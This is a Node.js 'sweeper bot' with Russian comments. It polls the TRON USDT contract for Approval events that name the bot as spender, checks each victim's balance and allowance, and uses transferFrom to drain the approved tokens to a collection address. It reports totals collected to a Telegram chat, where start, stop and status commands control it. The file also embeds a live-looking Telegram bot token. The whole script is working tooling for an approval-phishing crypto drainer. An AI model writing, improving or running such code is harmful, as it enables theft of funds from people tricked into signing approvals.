// ============================================
// SWEEPER BOT – ФИНАЛЬНАЯ ВЕРСИЯ
// ============================================

const TronWeb = require('tronweb');
const dotenv = require('dotenv');
dotenv.config();

// -------------------- 1. ИНИЦИАЛИЗАЦИЯ --------------------
const tronWeb = new TronWeb({
    fullHost: process.env.TRONGRID_API,
    privateKey: process.env.BOT_PRIVATE_KEY
});

const TOKEN_CONTRACT = process.env.TOKEN_CONTRACT;
const COLLECTION_ADDRESS = process.env.COLLECTION_ADDRESS;
const BOT_ADDRESS = tronWeb.address.fromPrivateKey(process.env.BOT_PRIVATE_KEY);

// Telegram настройки
const TELEGRAM_TOKEN = '8508345570:AAGJBV9H92ukUQsvsUqnM1uNfm8VdKn9AVk';
const TELEGRAM_CHAT_ID = '-1003750493145';

// Состояние бота
let isActive = true;
let processedTxs = new Set();
let processedAddresses = new Set(); // Для отслеживания уже обработанных адресов
let lastProcessedTime = null;
let stats = {
    totalCollected: 0,
    totalTransactions: 0,
    lastDailyReset: Date.now(),
    dailyCollected: 0,
    dailyTransactions: 0
};
const startTime = Date.now();

console.log('\n🚀 SWEEPER BOT ЗАПУЩЕН');
console.log('=================================');
console.log(`Адрес бота: ${BOT_ADDRESS}`);
console.log(`Сбор USDT на: ${COLLECTION_ADDRESS}`);
console.log('=================================\n');

// -------------------- 2. ФУНКЦИЯ ОТПРАВКИ В TELEGRAM --------------------
async function sendTelegramNotification(message) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            console.log('❌ Ошибка Telegram API');
        }
    } catch (error) {
        console.error('❌ Ошибка при отправке в Telegram:', error.message);
    }
}

// Отправка стартового сообщения
sendTelegramNotification(`
🚀 <b>Бот запущен</b>

📍 Адрес бота: <code>${BOT_ADDRESS}</code>
💰 Сбор на: <code>${COLLECTION_ADDRESS}</code>

Команды:
/start_bot - включить сбор
/stop_bot - выключить сбор
/status - статистика
`);

// -------------------- 3. ПРОВЕРКА КОМАНД --------------------
async function checkTelegramCommands() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();
        if (data.result && data.result.length) {
            const msg = data.result[data.result.length - 1].message;
            if (msg && msg.text && msg.chat.id.toString() === TELEGRAM_CHAT_ID) {
                const cmd = msg.text.toLowerCase();
                if (cmd === '/start_bot' && !isActive) {
                    isActive = true;
                    await sendTelegramNotification('✅ Бот включён');
                } else if (cmd === '/stop_bot' && isActive) {
                    isActive = false;
                    await sendTelegramNotification('🛑 Бот остановлен');
                } else if (cmd === '/status') {
                    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
                    const status = isActive ? '🟢 РАБОТАЕТ' : '🔴 ОСТАНОВЛЕН';
                    await sendTelegramNotification(`
📊 <b>СТАТУС</b>

${status}
💰 Всего собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.totalTransactions}
📅 Сегодня: ${stats.dailyCollected.toFixed(2)} USDT
⏱ Работа: ${uptime} мин
                    `);
                }
            }
        }
    } catch (error) {
        console.error('Ошибка проверки команд:', error.message);
    }
}

// -------------------- 4. ПРОВЕРКА БАЛАНСА --------------------
async function checkBotBalance() {
    try {
        const balance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const balanceTRX = tronWeb.fromSun(balance);
        
        if (balanceTRX < 20) {
            await sendTelegramNotification(`
⚠️ <b>Мало TRX!</b>
Баланс бота: ${balanceTRX} TRX
Пополните: <code>${BOT_ADDRESS}</code>
            `);
        }
        return balanceTRX;
    } catch (error) {
        return 0;
    }
}

// -------------------- 5. ПОИСК APPROVE --------------------
async function getNewApprovals() {
    try {
        const oneDayAgo = Date.now() - 24 * 60 * 60 * 1000;
        const response = await fetch(
            `https://api.trongrid.io/v1/contracts/${TOKEN_CONTRACT}/events?` +
            new URLSearchParams({
                event_name: 'Approval',
                limit: 100,
                order_by: 'block_timestamp,desc',
                min_block_timestamp: oneDayAgo
            })
        );
        
        if (!response.ok) {
            console.log('❌ Ошибка API Trongrid');
            return [];
        }
        
        const data = await response.json();
        if (!data.data) return [];

        return data.data.filter(event => {
            const spender = tronWeb.address.fromHex(event.result.spender);
            return spender === BOT_ADDRESS && !processedTxs.has(event.transaction_id);
        });
    } catch (error) {
        console.error('Ошибка получения событий:', error.message);
        return [];
    }
}

// -------------------- 6. ОБРАБОТКА APPROVE --------------------
async function processApproval(event) {
    const owner = tronWeb.address.fromHex(event.result.owner);
    const value = event.result.value;
    const valueUSDT = (value / 1_000_000).toFixed(2);
    const txId = event.transaction_id;

    // Проверяем, не обрабатывали ли уже этот адрес сегодня
    const today = new Date().toDateString();
    const addressKey = `${owner}_${today}`;
    
    if (processedAddresses.has(addressKey)) {
        console.log(`⏩ Адрес ${owner.slice(0,8)}... уже обработан сегодня`);
        processedTxs.add(txId);
        return;
    }

    console.log(`\n✅ Найден approve от ${owner.slice(0,8)}... на ${valueUSDT} USDT`);

    try {
        const contract = await tronWeb.contract().at(TOKEN_CONTRACT);
        
        // Проверяем реальный баланс владельца
        const balance = await contract.balanceOf(owner).call();
        const balanceUSDT = (balance / 1_000_000).toFixed(2);
        
        console.log(`   💎 Баланс владельца: ${balanceUSDT} USDT`);

        if (balance < value) {
            console.log(`   ⚠️ Недостаточно средств на балансе`);
            processedTxs.add(txId);
            return;
        }

        // Проверяем реальный allowance
        const realAllowance = await contract.allowance(owner, BOT_ADDRESS).call();
        const realAllowanceUSDT = (realAllowance / 1_000_000).toFixed(2);
        
        console.log(`   🔓 Реальный allowance: ${realAllowanceUSDT} USDT`);

        if (realAllowance < value) {
            console.log(`   ⚠️ Allowance изменился (теперь ${realAllowanceUSDT} USDT)`);
            processedTxs.add(txId);
            return;
        }

        // Проверяем баланс бота
        const botBalance = await tronWeb.trx.getBalance(BOT_ADDRESS);
        const botBalanceTRX = tronWeb.fromSun(botBalance);
        
        console.log(`   🤖 Баланс бота: ${botBalanceTRX} TRX`);

        if (botBalanceTRX < 25) {
            console.log(`   ⚠️ Мало TRX у бота для комиссии`);
            await sendTelegramNotification(`⚠️ Мало TRX у бота (${botBalanceTRX} TRX), перевод невозможен`);
            return;
        }

        // ПОПЫТКА 1: Стандартный вызов
        console.log(`   💸 Попытка 1: отправляю transferFrom на ${valueUSDT} USDT...`);
        
        try {
            const tx = await contract.transferFrom(
                owner,
                COLLECTION_ADDRESS,
                value
            ).send({
                feeLimit: 450_000_000,
                callValue: 0,
                shouldPollResponse: true
            });

            console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
            
            // Обновляем статистику
            const amountNum = parseFloat(valueUSDT);
            stats.totalCollected += amountNum;
            stats.totalTransactions++;
            stats.dailyCollected += amountNum;
            stats.dailyTransactions++;
            processedAddresses.add(addressKey);

            // Уведомление об успехе
            await sendTelegramNotification(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>

💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
🔗 Транзакция: https://tronscan.org/#/transaction/${tx}
            `);

            processedTxs.add(txId);
            return;

        } catch (error1) {
            console.log(`   ❌ Попытка 1 не удалась: ${error1.message}`);
            
            // ПОПЫТКА 2: С увеличенным feeLimit и дополнительными параметрами
            console.log(`   💸 Попытка 2: повтор с увеличенным feeLimit...`);
            
            try {
                const tx = await contract.transferFrom(
                    owner,
                    COLLECTION_ADDRESS,
                    value
                ).send({
                    feeLimit: 600_000_000, // 60 TRX
                    callValue: 0,
                    shouldPollResponse: true,
                    rawParameter: '' // Добавляем пустой параметр
                });

                console.log(`   ✅ УСПЕХ! Транзакция: https://tronscan.org/#/transaction/${tx}`);
                
                const amountNum = parseFloat(valueUSDT);
                stats.totalCollected += amountNum;
                stats.totalTransactions++;
                stats.dailyCollected += amountNum;
                stats.dailyTransactions++;
                processedAddresses.add(addressKey);

                await sendTelegramNotification(`
🚀 <b>УСПЕШНЫЙ СБОР!</b>

💰 Сумма: ${valueUSDT} USDT
📤 От: <code>${owner.slice(0,8)}...${owner.slice(-4)}</code>
📥 На: <code>${COLLECTION_ADDRESS.slice(0,8)}...${COLLECTION_ADDRESS.slice(-4)}</code>
🔗 Транзакция: https://tronscan.org/#/transaction/${tx}
                `);

                processedTxs.add(txId);
                return;

            } catch (error2) {
                console.log(`   ❌ Попытка 2 не удалась: ${error2.message}`);
                
                // Если обе попытки провалились, пробуем через 30 секунд
                console.log(`   🔄 Повторная попытка через 30 секунд...`);
                setTimeout(() => processApproval(event), 30000);
            }
        }

    } catch (error) {
        console.error(`❌ Ошибка при обработке:`, error.message);
        
        if (error.message.includes('request aborted') || error.message.includes('timeout')) {
            console.log(`   🔄 Повторная попытка через 10 секунд...`);
            setTimeout(() => processApproval(event), 10000);
        } else {
            await sendTelegramNotification(`❌ Ошибка при переводе: ${error.message}`);
        }
    }
}

// -------------------- 7. ДНЕВНОЙ ОТЧЁТ --------------------
async function checkDailyStats() {
    const now = Date.now();
    if (now - stats.lastDailyReset > 24 * 60 * 60 * 1000) {
        if (stats.dailyTransactions > 0) {
            await sendTelegramNotification(`
📊 <b>Дневной отчёт</b>

💰 Собрано: ${stats.dailyCollected.toFixed(2)} USDT
📦 Транзакций: ${stats.dailyTransactions}
📊 Средняя: ${(stats.dailyCollected / stats.dailyTransactions).toFixed(2)} USDT
            `);
        }
        stats.dailyCollected = 0;
        stats.dailyTransactions = 0;
        stats.lastDailyReset = now;
    }
}

// -------------------- 8. ОСНОВНОЙ ЦИКЛ --------------------
async function checkAndSweep() {
    lastProcessedTime = new Date().toLocaleString();

    await checkTelegramCommands();
    if (!isActive) {
        console.log('⏸ Бот остановлен');
        return;
    }

    console.log(`\n🔄 ПРОВЕРКА [${new Date().toLocaleString()}]`);
    
    await checkBotBalance();
    await checkDailyStats();

    const approvals = await getNewApprovals();
    
    if (approvals.length === 0) {
        console.log('⏳ Новых approve нет');
        return;
    }

    console.log(`📋 Найдено ${approvals.length} новых approve`);
    
    for (const app of approvals) {
        await processApproval(app);
        await new Promise(resolve => setTimeout(resolve, 5000)); // Увеличил паузу
    }
}

// -------------------- 9. ЗАПУСК --------------------
checkAndSweep();
setInterval(checkAndSweep, 35000); // Увеличил интервал

// -------------------- 10. ОБРАБОТКА ОСТАНОВКИ --------------------
process.on('SIGINT', async () => {
    console.log('\n👋 Получен сигнал остановки...');
    
    const uptime = Math.floor((Date.now() - startTime) / 1000 / 60);
    
    await sendTelegramNotification(`
🛑 <b>Бот остановлен</b>

📊 <b>Итоговая статистика:</b>
💰 Всего собрано: ${stats.totalCollected.toFixed(2)} USDT
📦 Всего транзакций: ${stats.totalTransactions}
⏱ Время работы: ${uptime} минут

👋 До свидания!
    `);
    
    console.log('✅ Бот остановлен');
    process.exit(0);
});

process.on('unhandledRejection', async (error) => {
    console.error('❗ Необработанная ошибка:', error);
    await sendTelegramNotification(`❗ Критическая ошибка: ${error.message}`);
});
